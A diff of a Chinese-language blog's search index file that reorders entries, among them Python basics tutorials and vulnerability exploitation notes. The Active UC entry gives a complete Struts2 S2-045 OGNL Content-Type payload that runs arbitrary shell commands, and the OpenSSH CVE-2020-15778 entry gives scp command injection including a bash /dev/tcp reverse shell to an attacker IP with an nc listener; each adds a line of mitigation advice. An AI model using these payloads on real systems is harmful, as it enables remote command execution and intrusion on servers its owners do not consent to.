@@ -983,30 +983,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-流程控制语句</title>
-    <url>//3e612c0e2f45.html</url>
-    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
-
-<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-正则表达式</title>
     <url>//ad2d1877a42a.html</url>
     <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>​        正则表达式（Regular Expression，常简写为regex或者RE），又称规则表达式，它不是某个编程语言所特有的，是计算机科学的一个概念，通常被用来检索和替换符合某些规则的文本。</p>
@@ -1158,6 +1134,30 @@
 </tr>
 </tbody></table>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">匹配url</span><br><span class="line"><span class="comment"># 正则的语法里面不能敲空格</span></span><br><span class="line">re.findall(<span class="string">&#x27;[a-zA-Z]&#123;4,5&#125;://\w*\.*\w+\.\w+&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;(https://|http://)(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;https://(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line">匹配邮箱</span><br><span class="line">re.findall(<span class="string">&#x27;.+@\w*\.*\w+&#x27;</span>,mail)</span><br><span class="line">re.findall(<span class="string">&#x27;.+@.+&#x27;</span>,mail)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-流程控制语句</title>
+    <url>//3e612c0e2f45.html</url>
+    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
+
+<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1622,6 +1622,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Active UC index.action远程命令执行漏洞</title>
+    <url>//20f03e999316.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
+
+<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
+<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+        <category>Active-UC</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Lanproxy任意文件读取-CVE-2021-3019</title>
     <url>//0e7fcf3b35d4.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
@@ -1657,33 +1684,6 @@
       <tags>
         <tag>信息泄露</tag>
         <tag>目录遍历</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Active UC index.action远程命令执行漏洞</title>
-    <url>//20f03e999316.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
-
-<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
-<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-        <category>Active-UC</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -2415,46 +2415,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
-    <url>//6d1490659228.html</url>
-    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
-<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
-<li>Openssh &gt;= 8.3p1</li>
-</ul>
-<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
-<li>Openssh &gt;= 8.3p1</li>
-<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
-<li>知道SSH密码</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;pwd&#96; &#x2F;home&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>
-
-
-
-<p>靶机</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.1&#x2F;8432 0&gt;&amp;1&#96; &#x2F;home&#x2F;test.txt&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
-<p>使用rsync代替scp</p>
-<p>官方暂无补丁</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>服务器应用漏洞</category>
-        <category>SSH</category>
-      </categories>
-      <tags>
-        <tag>命令注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Elasticsearch未授权访问</title>
     <url>//9db3aff65775.html</url>
     <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
@@ -2526,6 +2486,46 @@
       </categories>
       <tags>
         <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
+    <url>//6d1490659228.html</url>
+    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
+<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
+<li>Openssh &gt;= 8.3p1</li>
+</ul>
+<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
+<li>Openssh &gt;= 8.3p1</li>
+<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
+<li>知道SSH密码</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;pwd&#96; &#x2F;home&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>
+
+
+
+<p>靶机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.1&#x2F;8432 0&gt;&amp;1&#96; &#x2F;home&#x2F;test.txt&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
+<p>使用rsync代替scp</p>
+<p>官方暂无补丁</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>服务器应用漏洞</category>
+        <category>SSH</category>
+      </categories>
+      <tags>
+        <tag>命令注入</tag>
       </tags>
   </entry>
   <entry>
